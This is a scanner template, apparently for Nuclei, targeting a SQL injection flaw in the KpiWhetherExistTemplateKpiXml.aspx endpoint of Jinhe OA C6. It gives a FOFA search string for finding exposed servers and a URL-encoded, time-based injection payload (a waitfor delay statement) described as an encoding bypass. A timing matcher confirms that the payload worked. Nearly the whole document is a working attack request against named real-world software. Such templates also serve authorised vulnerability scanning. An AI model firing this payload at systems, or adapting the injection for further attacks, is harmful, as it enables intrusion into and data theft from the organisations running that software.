id: jinhe-oa-kpiwhetherexisttemplatekpixml-sqli
info:
  name: 金和OA KpiWhetherExistTemplateKpiXml.aspx 接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
        金和网络作为专业信息化服务商，提供组织协同OA系统开发平台及电子政务解决方案。其OA系统C6版本中的KpiWhetherExistTemplateKpiXml.aspx接口存在SQL注入安全缺陷，攻击者可利用该漏洞读取服务器敏感文件内容，实施内网服务探测，进而可能通过后续攻击链实现对目标系统的控制。
  tags: 金和OA

http:
  - raw:
      # baseline
      - |
        GET /c6/Jhsoft.Web.Appraise/KpiWhetherExistTemplateKpiXml.aspx/?SelectValue=1 HTTP/1.1
        Host: {{Hostname}}

      # payload（编码绕过）
      - |
        GET /c6/Jhsoft.Web.Appraise/KpiWhetherExistTemplateKpiXml.aspx/?SelectValue=%31%29%29%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a%35%27%2d%2d HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "duration_2 >= duration_1 + 4"